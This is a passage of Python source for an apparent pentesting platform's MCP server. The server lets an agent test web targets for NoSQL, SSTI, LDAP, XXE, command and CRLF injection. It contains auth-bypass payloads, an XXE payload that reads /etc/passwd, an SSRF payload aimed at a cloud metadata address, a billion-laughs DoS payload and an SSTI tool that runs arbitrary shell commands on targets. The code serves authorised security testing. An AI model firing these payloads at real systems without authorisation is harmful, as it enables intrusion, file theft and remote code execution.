"""
Injection MCP Server — UniVex Pentesting Platform

JSON-RPC 2.0 MCP server that exposes injection-class vulnerability testing
capabilities for the UniVex pentesting platform.

Port: 8010

Tools exposed
-------------
  nosql_injection_test   — Test NoSQL injection (MongoDB/CouchDB operator injection,
                           auth bypass via $gt/$ne/$exists/$regex operators)
  ssti_detect            — Detect Server-Side Template Injection using mathematical
                           probe payloads across Jinja2, Twig, Freemarker, Mako, Pebble
  ssti_exploit           — Generate and send SSTI exploit payloads for RCE per the
                           detected template engine
  ldap_injection_test    — LDAP filter injection for auth bypass and data extraction
                           using wildcard and filter manipulation payloads
  xxe_test               — XML External Entity injection (file read, SSRF via HTTP
                           callback, billion laughs DoS)
  command_injection_test — OS command injection via shell separators (;, |, &&,
                           $(), backticks)
  header_injection_test  — HTTP header injection / CRLF injection / response splitting

Safety controls
---------------
* Requests targeting RFC-1918 / loopback addresses are blocked unless
  ``allow_internal=True`` is explicitly passed (for lab environments).
* All subprocess calls are wrapped in asyncio timeouts to prevent hangs.
* Payloads are validated for maximum length to mitigate command injection
  through user-controlled inputs.

Architecture note
-----------------
Handlers issue HTTP requests via curl subprocesses, parse responses, and
return structured JSON findings so the agent can reason about next steps.
All tools degrade gracefully when targets are unreachable.
"""

from __future__ import annotations

import asyncio
import ipaddress
import json
import logging
import re
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from ..base_server import MCPServer, MCPTool

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Safety helpers
# ---------------------------------------------------------------------------

_PRIVATE_NETS = [
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("::1/128"),
]

MAX_PAYLOAD_LEN = 1024


def _is_internal(host: str) -> bool:
    """Return True if *host* resolves to a loopback or private-range address."""
    if host.lower() in ("localhost", "127.0.0.1", "::1"):
        return True
    try:
        addr = ipaddress.ip_address(host)
        return any(addr in net for net in _PRIVATE_NETS)
    except ValueError:
        # Hostname — allow and let the tool handle DNS resolution
        return False


def _extract_host(url: str) -> str:
    """Parse the hostname component from a URL string."""
    try:
        return urllib.parse.urlparse(url).hostname or ""
    except Exception:
        return ""


def _validate_url(url: str, allow_internal: bool = False) -> None:
    """Raise ValueError for invalid or disallowed target URLs.

    Checks:
    * URL must start with ``http://`` or ``https://``
    * Host must not be a private/loopback address unless *allow_internal* is True
    """
    if not re.match(r"^https?://", url, re.IGNORECASE):
        raise ValueError(
            f"Invalid URL scheme: {url!r} — must start with http:// or https://"
        )
    host = _extract_host(url)
    if not allow_internal and _is_internal(host):
        raise ValueError(
            f"Target {host!r} is an internal address. "
            "Pass allow_internal=True for lab environments."
        )


# ---------------------------------------------------------------------------
# Subprocess helpers
# ---------------------------------------------------------------------------


async def _run_cmd(
    cmd: List[str],
    timeout: int = 30,
) -> Tuple[int, str, str]:
    """Run *cmd* as a subprocess and return ``(returncode, stdout, stderr)``.

    The process is killed if it has not completed within *timeout* seconds.
    Returns ``(1, "", error_message)`` on timeout or launch failure so callers
    never need to handle exceptions.
    """
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout_b, stderr_b = await asyncio.wait_for(
            proc.communicate(), timeout=timeout
        )
        return (
            proc.returncode or 0,
            stdout_b.decode(errors="replace"),
            stderr_b.decode(errors="replace"),
        )
    except asyncio.TimeoutError:
        return 1, "", f"Command timed out after {timeout}s"
    except FileNotFoundError:
        return 1, "", f"Binary not found: {cmd[0]}"
    except Exception as exc:
        return 1, "", str(exc)


# ---------------------------------------------------------------------------
# HTTP helper
# ---------------------------------------------------------------------------


async def _curl_request(
    url: str,
    method: str = "GET",
    headers: Optional[Dict[str, str]] = None,
    data: Optional[str] = None,
    content_type: Optional[str] = None,
    extra_flags: Optional[List[str]] = None,
    timeout: int = 15,
) -> Tuple[int, str]:
    """Make an HTTP request via curl and return ``(http_status_code, response_body)``.

    The HTTP status code is extracted from a sentinel appended by curl's
    ``-w`` flag; the body is everything before that sentinel.  Returns
    ``(0, "")`` on curl failure so callers can treat ``status == 0`` as an
    error.

    Args:
        url:          Full target URL.
        method:       HTTP method (GET, POST, PUT, …).
        headers:      Extra request headers as a ``{name: value}`` dict.
        data:         Request body string.
        content_type: Value for the ``Content-Type`` header (only used when
                      *data* is provided and no ``Content-Type`` is in *headers*).
        extra_flags:  Additional raw curl arguments (e.g. ``["-L"]``).
        timeout:      Per-request timeout in seconds.

    Returns:
        Tuple of ``(http_status_int, response_body_str)``.
    """
    sentinel = "__UNIVEX_STATUS__"
    cmd = [
        "curl", "-s",
        "-o", "-",
        "-w", f"\n{sentinel}%{{http_code}}",
        "-X", method.upper(),
    ]

    # Merge headers
    merged_headers: Dict[str, str] = dict(headers or {})
    if data is not None and content_type and "Content-Type" not in merged_headers:
        merged_headers["Content-Type"] = content_type

    for name, value in merged_headers.items():
        cmd += ["-H", f"{name}: {value}"]

    if data is not None:
        cmd += ["-d", data]

    if extra_flags:
        cmd.extend(extra_flags)

    cmd += ["--max-time", str(timeout), url]

    rc, stdout, stderr = await _run_cmd(cmd, timeout=timeout + 5)

    if rc != 0 and not stdout:
        logger.debug("curl failed rc=%d: %s", rc, stderr[:200])
        return 0, ""

    status_code = 0
    body = stdout
    if sentinel in stdout:
        parts = stdout.rsplit(sentinel, 1)
        body = parts[0].rstrip("\n")
        try:
            status_code = int(parts[1].strip())
        except ValueError:
            pass

    return status_code, body


# ---------------------------------------------------------------------------
# InjectionServer
# ---------------------------------------------------------------------------


class InjectionServer(MCPServer):
    """MCP server exposing injection-class security testing tools.

    Covers NoSQL injection, SSTI detection and exploitation, LDAP injection,
    XXE, OS command injection, and HTTP header/CRLF injection.

    All tools return structured JSON findings compatible with the UniVex
    agent decision loop.
    """

    def __init__(self, allow_internal: bool = False) -> None:
        super().__init__(
            name="Injection",
            description=(
                "Injection security testing: NoSQL, SSTI, LDAP, XXE, "
                "OS command injection, HTTP header / CRLF injection"
            ),
            port=8010,
        )
        self._allow_internal = allow_internal

    # ------------------------------------------------------------------
    # MCPServer interface
    # ------------------------------------------------------------------

    def get_tools(self) -> List[MCPTool]:
        """Return the list of MCPTool definitions exposed by this server."""
        return [
            MCPTool(
                name="nosql_injection_test",
                description=(
                    "Test a target endpoint for NoSQL injection vulnerabilities "
                    "(MongoDB/CouchDB operator injection and authentication bypass). "
                    "Sends operator-based payloads ($gt, $ne, $exists, $regex) and "
                    "array-notation bypasses, then compares responses for evidence of "
                    "auth bypass or data leakage."
                ),
                parameters={
                    "type": "object",
                    "properties": {
                        "url": {
                            "type": "string",
                            "description": "Target URL of the endpoint to test",
                        },
                        "parameter": {
                            "type": "string",
                            "description": "Query / body parameter name to inject into",
                            "default": "password",
                        },
                        "method": {
                            "type": "string",
                            "enum": ["GET", "POST"],
                            "description": "HTTP method to use",
                            "default": "POST",
                        },
                        "headers": {
                            "type": "object",
                            "description": "Additional HTTP headers",
                            "default": {},
                        },
                        "allow_internal": {
                            "type": "boolean",
                            "description": "Allow internal/loopback targets (lab use)",
                            "default": False,
                        },
                    },
                    "required": ["url"],
                },
                phase="web_app_attack",
            ),
            MCPTool(
                name="ssti_detect",
                description=(
                    "Detect Server-Side Template Injection by sending mathematical probe "
                    "payloads (7*7=49) in the syntax of the most common template engines "
                    "(Jinja2, Twig, Freemarker, Mako, Pebble). A positive result means "
                    "the server evaluated the expression and returned '49' in the response."
                ),
                parameters={
                    "type": "object",
                    "properties": {
                        "url": {
                            "type": "string",
                            "description": "Target URL",
                        },
                        "parameter": {
                            "type": "string",
                            "description": "Injectable parameter name",
                            "default": "name",
                        },
                        "method": {
                            "type": "string",
                            "enum": ["GET", "POST"],
                            "default": "GET",
                        },
                        "value_prefix": {
                            "type": "string",
                            "description": "String to prepend before each probe payload",
                            "default": "",
                        },
                        "headers": {
                            "type": "object",
                            "description": "Additional HTTP headers",
                            "default": {},
                        },
                        "allow_internal": {
                            "type": "boolean",
                            "default": False,
                        },
                    },
                    "required": ["url"],
                },
                phase="web_app_attack",
            ),
            MCPTool(
                name="ssti_exploit",
                description=(
                    "Generate and send a Server-Side Template Injection exploit payload "
                    "for Remote Code Execution using the syntax of the specified template "
                    "engine. Supported engines: jinja2, twig, freemarker, mako, pebble."
                ),
                parameters={
                    "type": "object",
                    "properties": {
                        "url": {
                            "type": "string",
                            "description": "Target URL",
                        },
                        "parameter": {
                            "type": "string",
                            "description": "Injectable parameter name",
                        },
                        "engine": {
                            "type": "string",
                            "enum": ["jinja2", "twig", "freemarker", "mako", "pebble"],
                            "description": "Detected template engine to exploit",
                        },
                        "command": {
                            "type": "string",
                            "description": "Shell command to execute on the server",
                            "default": "id",
                        },
                        "method": {
                            "type": "string",
                            "enum": ["GET", "POST"],
                            "default": "GET",
                        },
                        "headers": {
                            "type": "object",
                            "description": "Additional HTTP headers",
                            "default": {},
                        },
                        "allow_internal": {
                            "type": "boolean",
                            "default": False,
                        },
                    },
                    "required": ["url", "parameter", "engine"],
                },
                phase="web_app_attack",
            ),
            MCPTool(
                name="ldap_injection_test",
                description=(
                    "Test an authentication endpoint for LDAP injection vulnerabilities. "
                    "Injects classic LDAP filter bypass payloads into username and password "
                    "fields to attempt authentication bypass or data extraction."
                ),
                parameters={
                    "type": "object",
                    "properties": {
                        "url": {
                            "type": "string",
                            "description": "Target login / authentication endpoint URL",
                        },
                        "username_field": {
                            "type": "string",
                            "description": "Name of the username form field",
                            "default": "username",
                        },
                        "password_field": {
                            "type": "string",
                            "description": "Name of the password form field",
                            "default": "password",
                        },
                        "method": {
                            "type": "string",
                            "enum": ["POST", "GET"],
                            "default": "POST",
                        },
                        "headers": {
                            "type": "object",
                            "description": "Additional HTTP headers",
                            "default": {},
                        },
                        "allow_internal": {
                            "type": "boolean",
                            "default": False,
                        },
                    },
                    "required": ["url"],
                },
                phase="web_app_attack",
            ),
            MCPTool(
                name="xxe_test",
                description=(
                    "Test an XML-accepting endpoint for XML External Entity (XXE) injection. "
                    "Sends three payloads: external file read (/etc/passwd), SSRF via HTTP "
                    "callback to a supplied URL, and a truncated billion-laughs DoS payload. "
                    "Requires the endpoint to accept XML."
                ),
                parameters={
                    "type": "object",
                    "properties": {
                        "url": {
                            "type": "string",
                            "description": "Target URL that accepts XML in the request body",
                        },
                        "method": {
                            "type": "string",
                            "enum": ["POST", "PUT"],
                            "default": "POST",
                        },
                        "content_type": {
                            "type": "string",
                            "description": "Content-Type to use for XML body",
                            "default": "text/xml",
                        },
                        "custom_entity_url": {
                            "type": "string",
                            "description": (
                                "URL to use in the SSRF callback XXE payload "
                                "(e.g. an OOB listener URL). Defaults to http://169.254.169.254/."
                            ),
                            "default": "http://169.254.169.254/",
                        },
                        "headers": {
                            "type": "object",
                            "description": "Additional HTTP headers",
                            "default": {},
                        },
                        "allow_internal": {
                            "type": "boolean",
                            "default": False,
                        },
                    },
                    "required": ["url"],
                },
                phase="web_app_attack",
            ),
            MCPTool(
                name="command_injection_test",
                description=(
                    "Test a URL parameter for OS command injection by appending shell "
                    "separators followed by a unique echo probe. Checks the response for "
                    "the probe string to confirm injection. Separators tested: "
                    "semicolon (;), pipe (|), logical-AND (&&), $() substitution, backtick."
                ),
                parameters={
                    "type": "object",
                    "properties": {
                        "url": {
                            "type": "string",
                            "description": "Target URL",
                        },
                        "parameter": {
                            "type": "string",
                            "description": "Query or body parameter name to inject into",
                        },
                        "method": {
                            "type": "string",
                            "enum": ["GET", "POST"],
                            "default": "GET",
                        },
                        "separators": {
                            "type": "array",
                            "items": {"type": "string"},
                            "description": (
                                "Shell separators to test. "
                                "Defaults to all: ';', '|', '&&', '$()', '`'."
                            ),
                            "default": [],
                        },
                        "headers": {
                            "type": "object",
                            "description": "Additional HTTP headers",
                            "default": {},
                        },
                        "allow_internal": {
                            "type": "boolean",
                            "default": False,
                        },
                    },
                    "required": ["url", "parameter"],
                },
                phase="web_app_attack",
            ),
            MCPTool(
                name="header_injection_test",
                description=(
                    "Test for HTTP header injection and CRLF injection / response splitting "
                    "by injecting carriage-return / line-feed sequences into the value of a "
                    "specified request header. Checks the response headers for evidence of "
                    "injected content."
                ),
                parameters={
                    "type": "object",
                    "properties": {
                        "url": {
                            "type": "string",
                            "description": "Target URL",
                        },
                        "target_header": {
                            "type": "string",
                            "description": "Request header whose value will be injected",
                            "default": "User-Agent",
                        },
                        "method": {
                            "type": "string",
                            "enum": ["GET", "POST", "PUT"],
                            "default": "GET",
                        },
                        "headers": {
                            "type": "object",
                            "description": "Additional base HTTP headers",
                            "default": {},
                        },
                        "allow_internal": {
                            "type": "boolean",
                            "default": False,
                        },
                    },
                    "required": ["url"],
                },
                phase="web_app_attack",
            ),
        ]

    async def execute_tool(self, tool_name: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """Dispatch *tool_name* to its implementation method.

        Raises ``ValueError`` for unknown tool names so the base server can
        return a JSON-RPC method-not-found error.
        """
        dispatch: Dict[str, Any] = {
            "nosql_injection_test": self._nosql_injection_test,
            "ssti_detect": self._ssti_detect,
            "ssti_exploit": self._ssti_exploit,
            "ldap_injection_test": self._ldap_injection_test,
            "xxe_test": self._xxe_test,
            "command_injection_test": self._command_injection_test,
            "header_injection_test": self._header_injection_test,
        }
        handler = dispatch.get(tool_name)
        if handler is None:
            raise ValueError(f"Unknown tool: {tool_name!r}")
        return await handler(params)

    # ------------------------------------------------------------------
    # Tool implementations
    # ------------------------------------------------------------------

    async def _nosql_injection_test(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Test *url* for NoSQL injection via MongoDB/CouchDB operator payloads.

        Sends a baseline request, then sends requests with each of the
        standard NoSQL operator-injection payloads.  A finding is recorded
        when the injected response differs significantly from the baseline
        (e.g. larger body, 200 vs 401, JSON objects returned).

        Args:
            params: Tool parameter dict. Keys: url, parameter, method,
                    headers, allow_internal.

        Returns:
            Structured result dict with ``findings`` list.
        """
        url: str = params.get("url", "")
        parameter: str = params.get("parameter", "password")
        method: str = params.get("method", "POST").upper()
        headers: Dict[str, str] = params.get("headers", {})
        allow_internal: bool = params.get("allow_internal", self._allow_internal)

        try:
            _validate_url(url, allow_internal)
        except ValueError as exc:
            return {"success": False, "error": str(exc), "findings": []}

        # NoSQL operator injection payloads (JSON body and query-string variants)
        json_payloads = [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$exists": true}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
        ]
        qs_payloads = [
            ("[$ne]", "1"),
            ("[$gt]", ""),
            ("[$regex]", ".*"),
        ]

        findings: List[Dict[str, Any]] = []

        # --- Baseline ---
        baseline_status, baseline_body = await self._baseline_request(
            url, method, parameter, headers
        )

        # --- JSON operator payloads (POST / JSON body) ---
        if method == "POST":
            for raw_payload in json_payloads:
                try:
                    payload_obj = json.loads(raw_payload)
                except json.JSONDecodeError:
                    continue

                body = json.dumps({parameter: payload_obj})
                req_headers = {**headers, "Content-Type": "application/json"}
                status, body_text = await _curl_request(
                    url, method=method, headers=req_headers,
                    data=body, timeout=12,
                )

                finding = _analyse_nosql_response(
                    payload=raw_payload,
                    status=status,
                    body=body_text,
                    baseline_status=baseline_status,
                    baseline_body=baseline_body,
                )
                if finding:
                    findings.append(finding)

        # --- Query-string array-notation payloads ---
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        for qs_suffix, qs_value in qs_payloads:
            injected_param = f"{parameter}{qs_suffix}"
            new_qs = {**qs, injected_param: [qs_value]}
            injected_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(new_qs, doseq=True))
            )
            status, body_text = await _curl_request(
                injected_url, method="GET", headers=headers, timeout=12
            )
            finding = _analyse_nosql_response(
                payload=f"{injected_param}={qs_value}",
                status=status,
                body=body_text,
                baseline_status=baseline_status,
                baseline_body=baseline_body,
            )
            if finding:
                findings.append(finding)

        return {
            "success": True,
            "url": url,
            "parameter": parameter,
            "findings": findings,
            "total": len(findings),
            "owasp_tag": "A03:2021-Injection",
        }

    async def _ssti_detect(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Detect SSTI by sending mathematical probe payloads across template engines.

        Each probe embeds the expression ``7*7`` in the syntax of a specific
        engine and checks whether the response contains ``49`` — proof that
        the server evaluated it.

        Args:
            params: Keys: url, parameter, method, value_prefix, headers,
                    allow_internal.

        Returns:
            Dict with ``vulnerable`` bool, ``engine_hint`` (first matching
            engine or ``"unknown"``), and ``findings`` list.
        """
        url: str = params.get("url", "")
        parameter: str = params.get("parameter", "name")
        method: str = params.get("method", "GET").upper()
        value_prefix: str = params.get("value_prefix", "")
        headers: Dict[str, str] = params.get("headers", {})
        allow_internal: bool = params.get("allow_internal", self._allow_internal)

        try:
            _validate_url(url, allow_internal)
        except ValueError as exc:
            return {"success": False, "error": str(exc), "findings": [], "vulnerable": False}

        # Probe payloads mapped to their engine hint
        probes: List[Tuple[str, str]] = [
            ("{{7*7}}", "jinja2/twig"),
            ("${7*7}", "freemarker/mako"),
            ("<%= 7*7 %>", "erb/pebble"),
            ("#{7*7}", "ruby/pebble"),
            ("*{7*7}", "spring-el"),
        ]
        expected = "49"

        findings: List[Dict[str, Any]] = []
        engine_hint = "unknown"

        for template_payload, hint in probes:
            full_value = f"{value_prefix}{template_payload}"
            status, body = await self._send_param_request(
                url, method, parameter, full_value, headers
            )

            hit = expected in body
            findings.append({
                "payload": full_value,
                "engine_hint": hint,
                "expected": expected,
                "http_status": status,
                "vulnerable": hit,
                "evidence": _extract_snippet(body, expected, window=60) if hit else "",
            })

            if hit and engine_hint == "unknown":
                engine_hint = hint

        vulnerable = any(f["vulnerable"] for f in findings)
        return {
            "success": True,
            "url": url,
            "parameter": parameter,
            "vulnerable": vulnerable,
            "engine_hint": engine_hint if vulnerable else None,
            "findings": findings,
            "owasp_tag": "A03:2021-Injection",
        }

    async def _ssti_exploit(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Send an engine-specific SSTI RCE payload and capture output.

        Builds a template expression that executes *command* on the server
        using the syntax for *engine*.  The response is scanned for the
        command output marker ``UNIVEX_SSTI_PROBE``.

        Args:
            params: Keys: url, parameter, engine, command, method, headers,
                    allow_internal.

        Returns:
            Dict with ``output_found`` bool, ``evidence`` snippet, and
            the exact ``payload`` sent.
        """
        url: str = params.get("url", "")
        parameter: str = params.get("parameter", "name")
        engine: str = params.get("engine", "jinja2").lower()
        command: str = params.get("command", "id")
        method: str = params.get("method", "GET").upper()
        headers: Dict[str, str] = params.get("headers", {})
        allow_internal: bool = params.get("allow_internal", self._allow_internal)

        try:
            _validate_url(url, allow_internal)
        except ValueError as exc:
            return {"success": False, "error": str(exc), "findings": []}

        try:
            payload = _build_ssti_payload(engine, command)
        except ValueError as exc:
            return {"success": False, "error": str(exc), "findings": []}
        if payload is None:
            if engine in _SSTI_PAYLOADS:
                # Engine is known but has no exploitable RCE gadget (e.g. Pebble)
                return {
                    "success": False,
                    "error": (
                        f"Engine {engine!r} is detectable but has no known universal RCE gadget. "
                        "Use ssti_detect to confirm vulnerability, then attempt manual exploitation."
                    ),
                    "exploitable_engines": sorted(_EXPLOITABLE_ENGINES),
                    "findings": [],
                }
            return {
                "success": False,
                "error": f"Unsupported engine: {engine!r}",
                "supported": sorted(_SSTI_PAYLOADS.keys()),
                "exploitable_engines": sorted(_EXPLOITABLE_ENGINES),
                "findings": [],
            }

        try:
            status, body = await self._send_param_request(
                url, method, parameter, payload, headers
            )
        except Exception as exc:
            return {"success": False, "error": str(exc), "findings": []}

        # Look for typical command output patterns (uid=, groups=, or the raw output)
        output_found = bool(
            re.search(r"uid=\d+|gid=\d+|root|www-data", body)
            or (command.strip() != "id" and len(body) > 20)
        )

        evidence = ""
        if output_found:
            # Try to extract the most relevant line
            for line in body.splitlines():
                if re.search(r"uid=|root|gid=", line):
                    evidence = line.strip()[:200]
                    break
            if not evidence:
                evidence = body[:200]

        return {
            "success": True,
            "url": url,
            "parameter": parameter,
            "engine": engine,
            "command": command,
            "payload": payload,
            "http_status": status,
            "output_found": output_found,
            "evidence": evidence,
            "severity": "critical" if output_found else "info",
            "owasp_tag": "A03:2021-Injection",
        }

    async def _ldap_injection_test(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Test an authentication endpoint for LDAP filter injection.

        Submits crafted LDAP filter-escape payloads in the username and
        password fields and compares responses to a baseline to detect auth
        bypass (HTTP 200, session token, admin dashboard redirect, etc.).

        Args:
            params: Keys: url, username_field, password_field, method,
                    headers, allow_internal.

        Returns:
            Dict with ``findings`` list and ``total`` count.
        """
        url: str = params.get("url", "")
        username_field: str = params.get("username_field", "username")
        password_field: str = params.get("password_field", "password")
        method: str = params.get("method", "POST").upper()
        headers: Dict[str, str] = params.get("headers", {})
        allow_internal: bool = params.get("allow_internal", self._allow_internal)

        try:
            _validate_url(url, allow_internal)
        except ValueError as exc:
            return {"success": False, "error": str(exc), "findings": []}

        # LDAP auth-bypass payloads: (username_value, password_value, label)
        bypass_payloads: List[Tuple[str, str, str]] = [
            ("*)(|(*))", "invalid", "wildcard_username"),
            ("admin)(|(password=*)", "invalid", "admin_filter_escape"),
            ("*(|(objectclass=*))", "invalid", "objectclass_bypass"),
            ("*", "*", "wildcard_both_fields"),
            ("admin)(&)", "x", "false_filter_append"),
        ]

        findings: List[Dict[str, Any]] = []

        # Baseline: use a clearly invalid credential to get the failure response
        baseline_body_data = json.dumps({username_field: "UNIVEX_BASELINE_USER_9x7z", password_field: "UNIVEX_BASELINE_PASS_9x7z"})
        baseline_status, baseline_body = await _curl_request(
            url,
            method=method,
            headers={**headers, "Content-Type": "application/json"},
            data=baseline_body_data,
            timeout=12,
        )

        for uname, pwd, label in bypass_payloads:
            body_data = json.dumps({username_field: uname, password_field: pwd})
            status, body = await _curl_request(
                url,
                method=method,
                headers={**headers, "Content-Type": "application/json"},
                data=body_data,
                timeout=12,
            )

            finding = _analyse_auth_bypass(
                label=label,
                username=uname,
                password=pwd,
                status=status,
                body=body,
                baseline_status=baseline_status,
                baseline_body=baseline_body,
            )
            if finding:
                findings.append(finding)

        return {
            "success": True,
            "url": url,
            "findings": findings,
            "total": len(findings),
            "owasp_tag": "A03:2021-Injection",
        }

    async def _xxe_test(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Test an XML endpoint for XXE injection vulnerabilities.

        Sends three distinct XXE payloads:
        1. External file read — attempts to read ``/etc/passwd``.
        2. SSRF callback — triggers an outbound HTTP request to *custom_entity_url*.
        3. Billion laughs (truncated) — DoS via entity expansion (limited depth).

        Detects file read by checking for ``root:`` in the response.
        Detects SSRF by a significant body difference from baseline.

        Args:
            params: Keys: url, method, content_type, custom_entity_url,
                    headers, allow_internal.

        Returns:
            Dict with ``findings`` list keyed by type.
        """
        url: str = params.get("url", "")
        method: str = params.get("method", "POST").upper()
        content_type: str = params.get("content_type", "text/xml")
        custom_entity_url: str = params.get("custom_entity_url", "http://169.254.169.254/")
        headers: Dict[str, str] = params.get("headers", {})
        allow_internal: bool = params.get("allow_internal", self._allow_internal)

        try:
            _validate_url(url, allow_internal)
        except ValueError as exc:
            return {"success": False, "error": str(exc), "findings": []}

        findings: List[Dict[str, Any]] = []

        # 1. File read — /etc/passwd
        file_read_payload = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE foo [\n'
            '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
            ']>\n'
            '<root><data>&xxe;</data></root>'
        )
        status, body = await _curl_request(
            url, method=method,
            headers=headers, data=file_read_payload,
            content_type=content_type, timeout=15,
        )
        if "root:" in body or "daemon:" in body or "/bin/" in body:
            findings.append({
                "type": "file_read",
                "payload": file_read_payload,
                "evidence": _extract_snippet(body, "root:", window=120),
                "severity": "critical",
            })
        else:
            findings.append({
                "type": "file_read",
                "payload": file_read_payload,
                "evidence": "",
                "severity": "not_triggered",
            })

        # 2. SSRF via HTTP callback entity
        ssrf_payload = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE foo [\n'
            f'  <!ENTITY xxe SYSTEM "{custom_entity_url}">\n'
            ']>\n'
            '<root><data>&xxe;</data></root>'
        )
        status_ssrf, body_ssrf = await _curl_request(
            url, method=method,
            headers=headers, data=ssrf_payload,
            content_type=content_type, timeout=15,
        )
        # SSRF evidence: a significantly different body suggests entity was fetched
        ssrf_triggered = bool(
            body_ssrf
            and len(body_ssrf) > 50
            and body_ssrf != body
        )
        findings.append({
            "type": "ssrf_callback",
            "payload": ssrf_payload,
            "evidence": body_ssrf[:200] if ssrf_triggered else "",
            "severity": "high" if ssrf_triggered else "not_triggered",
        })

        # 3. Billion laughs (truncated to 3 expansion levels — safe for testing)
        billion_laughs = (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE lolz [\n'
            '  <!ENTITY lol "lol">\n'
            '  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n'
            '  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n'
            ']>\n'
            '<root><data>&lol3;</data></root>'
        )
        # Use a shorter timeout — a vulnerable server may hang or OOM
        status_bl, body_bl = await _curl_request(
            url, method=method,
            headers=headers, data=billion_laughs,
            content_type=content_type, timeout=8,
        )
        dos_triggered = status_bl == 0 or (status_bl >= 500 and status_bl < 600)
        findings.append({
            "type": "billion_laughs_dos",
            "payload": billion_laughs,
            "evidence": f"HTTP {status_bl}" if dos_triggered else "",
            "severity": "high" if dos_triggered else "not_triggered",
        })

        triggered = [f for f in findings if f.get("severity") not in ("not_triggered", "info")]
        return {
            "success": True,
            "url": url,
            "findings": findings,
            "total": len(triggered),
            "owasp_tag": "A05:2021-Security_Misconfiguration",
        }

    async def _command_injection_test(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Test a parameter for OS command injection via shell separators.

        Uses a unique probe string (``UNIVEX_CMD_PROBE_OK``) echoed via each
        separator variant.  A hit is confirmed when the probe string appears
        verbatim in the server response.

        Args:
            params: Keys: url, parameter, method, separators, headers,
                    allow_internal.

        Returns:
            Dict with ``findings`` list keyed by separator.
        """
        url: str = params.get("url", "")
        parameter: str = params.get("parameter", "")
        method: str = params.get("method", "GET").upper()
        custom_separators: List[str] = params.get("separators", [])
        headers: Dict[str, str] = params.get("headers", {})
        allow_internal: bool = params.get("allow_internal", self._allow_internal)

        try:
            _validate_url(url, allow_internal)
        except ValueError as exc:
            return {"success": False, "error": str(exc), "findings": []}

        if not parameter:
            return {
                "success": False,
                "error": "parameter is required for command_injection_test",
                "findings": [],
            }

        probe = "UNIVEX_CMD_PROBE_OK"
        base_value = "test"

        # Default separator set covers the most common shell injection vectors
        default_separators = [";", "|", "&&", "$(echo)", "`echo`"]
        separators = custom_separators if custom_separators else default_separators

        findings: List[Dict[str, Any]] = []

        for sep in separators:
            # Build the injected value depending on separator style
            if sep == "$(echo)":
                injected_value = f"{base_value}$(echo {probe})"
            elif sep == "`echo`":
                injected_value = f"{base_value}`echo {probe}`"
            else:
                injected_value = f"{base_value}{sep} echo {probe}"

            try:
                status, body = await self._send_param_request(
                    url, method, parameter, injected_value, headers
                )
            except Exception as exc:
                logger.debug("Command injection probe error sep=%r: %s", sep, exc)
                continue

            if probe in body:
                findings.append({
                    "separator": sep,
                    "payload": injected_value,
                    "http_status": status,
                    "evidence": _extract_snippet(body, probe, window=80),
                    "severity": "critical",
                })

        return {
            "success": True,
            "url": url,
            "parameter": parameter,
            "findings": findings,
            "total": len(findings),
            "owasp_tag": "A03:2021-Injection",
        }

    async def _header_injection_test(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """Test for HTTP header injection and CRLF / response splitting.

        Injects carriage-return + line-feed sequences (raw, URL-encoded, and
        newline-only variants) into the value of *target_header*.  The
        response headers are captured via curl's ``-D -`` flag and inspected
        for the injected header ``X-Injected: univex-probe``.

        Args:
            params: Keys: url, target_header, method, headers, allow_internal.

        Returns:
            Dict with ``findings`` list.
        """
        url: str = params.get("url", "")
        target_header: str = params.get("target_header", "User-Agent")
        method: str = params.get("method", "GET").upper()
        base_headers: Dict[str, str] = params.get("headers", {})
        allow_internal: bool = params.get("allow_internal", self._allow_internal)

        try:
            _validate_url(url, allow_internal)
        except ValueError as exc:
            return {"success": False, "error": str(exc), "findings": []}

        injected_header_name = "X-Injected"
        injected_header_value = "univex-probe"
        injected_line = f"{injected_header_name}: {injected_header_value}"

        # CRLF variants to test
        crlf_variants: List[Tuple[str, str]] = [
            ("\r\n", "raw_crlf"),
            ("%0d%0a", "url_encoded_crlf"),
            ("\n", "raw_lf"),
            ("%0a", "url_encoded_lf"),
            ("%0D%0A", "url_encoded_crlf_upper"),
        ]

        findings: List[Dict[str, Any]] = []

        for crlf, variant_label in crlf_variants:
            injected_value = f"UniVex-Probe{crlf}{injected_line}"
            test_headers = {**base_headers, target_header: injected_value}

            # Use curl with -D - to dump response headers to stdout
            status, raw_response = await _curl_request(
                url,
                method=method,
                headers=test_headers,
                extra_flags=["-D", "-"],
                timeout=12,
            )

            # Check for injected header in the response (response splitting)
            header_found = injected_header_name.lower() in raw_response.lower()
            probe_found = injected_header_value in raw_response

            if header_found or probe_found:
                findings.append({
                    "header": target_header,
                    "crlf_variant": variant_label,
                    "payload": injected_value,
                    "http_status": status,
                    "evidence": _extract_snippet(
                        raw_response, injected_header_name, window=120
                    ),
                    "severity": "high",
                })

        return {
            "success": True,
            "url": url,
            "target_header": target_header,
            "findings": findings,
            "total": len(findings),
